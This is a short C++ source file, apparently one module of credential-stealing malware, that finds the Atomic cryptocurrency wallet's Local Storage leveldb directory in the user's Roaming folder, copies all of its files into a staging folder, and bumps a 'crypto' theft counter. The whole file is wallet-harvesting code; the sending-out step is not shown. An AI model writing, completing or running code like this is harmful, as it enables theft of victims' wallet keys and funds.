//
// Created by TERETERY on 22.06.2024.
//

#include "Atomic.h"

static const fs::path ATOMIC_PATH = Utils::getRoamingPath() / "atomic" / "Local Storage" / "leveldb";

void Atomic::execute(fs::path &root) {
    std::vector<fs::path> paths = FilesUtil::scanDirectory(ATOMIC_PATH);

    if(paths.empty())
        return;

    Counter::increaseCrypto();
    fs::path dst = root / "Atomic";
    fs::create_directories(dst);

    for(fs::path &path : paths)
    {
        Utils::copy(path, dst);
    }
}